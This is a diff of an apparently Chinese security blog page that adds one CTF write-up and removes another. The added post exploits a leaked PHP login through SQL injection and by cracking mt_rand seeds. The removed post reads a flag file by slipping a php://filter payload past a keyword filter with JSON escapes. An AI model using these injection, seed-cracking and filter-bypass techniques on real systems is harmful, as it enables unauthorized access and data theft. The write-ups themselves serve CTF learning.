@@ -172,6 +172,84 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-伪随机数以及文件泄露" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" class="article-date">
+  	<time datetime="2021-10-13T16:00:00.000Z" itemprop="datePublished">2021-10-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/">
+        伪随机数以及文件泄露
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="伪随机数以及文件泄露"><a href="#伪随机数以及文件泄露" class="headerlink" title="伪随机数以及文件泄露"></a>伪随机数以及文件泄露</h1><p>打开页面，发现没有什么提示信息，所以用dirsearch去扫描，发现有文件泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.zip</span><br></pre></td></tr></table></figure>
+<p>打开源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#x27;Content-type:text/html; charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;login&#x27;]))&#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    $Private_key = $_POST[&#x27;Private_key&#x27;];</span><br><span class="line">    if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123;</span><br><span class="line">        // 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    else if($Private_key != &#x27;*************&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if($Private_key === &#x27;************&#x27;)&#123;</span><br><span class="line">        $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; </span><br><span class="line">        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">        mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">// genarate public_key </span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></pre></td></tr></table></figure>
+<p>从源码中，我们发现一个登录界面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&#x27;refresh:2; url=login.html&#x27;);</span><br></pre></td></tr></table></figure>
+<p>我们尝试构造/login.html，然后登录，发现它需要用户名，密码和私钥，而从源码中，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span><br></pre></td></tr></table></figure>
+<p>所以我们可以知道用户名为crispr，密码我们可以构造万能钥匙1’or ‘1=1绕过，而对于私钥，我们知道公钥是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Public_key = KVQP0LdJKRaV3n9D</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用爆破的方式获取种子，从而得到私钥</p>
+<p>首先我们要获取爆破种子的参数值，exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">key=&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br><span class="line">m=&#x27;&#x27;</span><br><span class="line">for i in key:</span><br><span class="line">    for j in range(len(s)):</span><br><span class="line">        if i==s[j]:</span><br><span class="line">            m+=&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;.format(j,j,len(s)-1)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure>
+<p>然后我们使用php_mt_seed来对种子进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1775196155</span><br></pre></td></tr></table></figure>
+<p>然后我们就可以得到私钥，exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(1775196155);</span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  //genarate private_key</span><br><span class="line">function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">echo public_key() . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo private_key();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到私钥为XuNhoueCDCGc，然后登录即可得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-逗号的绕过以及二次注入" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1097,91 +1175,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF/" rel="tag">模板</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-json字符绕过以及伪协议" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/05/json%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
-  	<time datetime="2021-10-04T16:00:00.000Z" itemprop="datePublished">2021-10-05</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/05/json%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-        json字符绕过以及伪协议
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="json字符绕过以及伪协议"><a href="#json字符绕过以及伪协议" class="headerlink" title="json字符绕过以及伪协议"></a>json字符绕过以及伪协议</h1><p>打开页面，发现是源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($str) &#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    // no path traversal</span><br><span class="line">    &#x27;\.\.&#x27;,</span><br><span class="line">    // no stream wrapper</span><br><span class="line">    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,</span><br><span class="line">    // no data exfiltration</span><br><span class="line">    &#x27;flag&#x27;</span><br><span class="line">  ];</span><br><span class="line">  $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;;</span><br><span class="line">  if (preg_match($regexp, $str)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$json = json_decode($body, true);</span><br><span class="line"></span><br><span class="line">if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123;</span><br><span class="line">  $page = $json[&#x27;page&#x27;];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  if (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// no data exfiltration!!!</span><br><span class="line">$content = preg_replace(&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);</span><br><span class="line">echo json_encode([&#x27;content&#x27; =&gt; $content]); </span><br></pre></td></tr></table></figure>
-<p>通过分析源码，我们可知道</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$body=file_get_contents(&#x27;php://input&#x27;);</span><br></pre></td></tr></table></figure>
-<p>是$body将接受post提交的数据</p>
-<p>而代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$json=json_decode($body,true);</span><br></pre></td></tr></table></figure>
-<p>是将$body进行json解码</p>
-<p>而从源码中的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function is_valid($str) &#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    // no path traversal</span><br><span class="line">    &#x27;\.\.&#x27;,</span><br><span class="line">    // no stream wrapper</span><br><span class="line">    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,</span><br><span class="line">    // no data exfiltration</span><br><span class="line">    &#x27;flag&#x27;</span><br><span class="line">  ];</span><br><span class="line">  $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;;</span><br><span class="line">  if (preg_match($regexp, $str)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可知，这个自定义函数is_valid()的作用是正则过滤掉一些关键词，从</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$banword = [</span><br><span class="line">    // no path traversal</span><br><span class="line">    &#x27;\.\.&#x27;,</span><br><span class="line">    // no stream wrapper</span><br><span class="line">    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,</span><br><span class="line">    // no data exfiltration</span><br><span class="line">    &#x27;flag&#x27;</span><br><span class="line">  ];</span><br></pre></td></tr></table></figure>
-<p>我们可以知道.和flag，以及一些协议都被过滤了，而我们看向这个if</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123;</span><br><span class="line">  $page = $json[&#x27;page&#x27;];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  if (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们知道我们需要$body不包含过滤的关键词，$json和$json[‘page’]不为空，从而让我们可以利用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = file_get_contents($page);</span><br></pre></td></tr></table></figure>
-<p>来读取flag，而且我们还要让$content有效，且得到的$content不包含正则过滤的关键词，从而绕过这个if</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!$content || !is_valid($content))</span><br></pre></td></tr></table></figure>
-<p>而最后的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = preg_replace(&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);</span><br></pre></td></tr></table></figure>
-<p>如果得到的$content中包含ctf字段的话，会用censored来代替，通过对源码的通读，我们可以知道源码中只对post提交的json编码的数据进行检验，所以我们可以利用json转义字符绕过，即将字符转为16进制，并加上\u，实例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f的16进制是70，则json转义字符为\u0070</span><br></pre></td></tr></table></figure>
-<p>因此，我们可以利用php伪协议来读取flag，即post提交</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;page&quot; : &quot;\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>然后得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;ZmxhZ3tiOWRkZGExNy05NjI2LTRhODAtYTcxMC0wMzgxZTkzMWE1MzB9Cg==&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p>base64解码，即可得到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
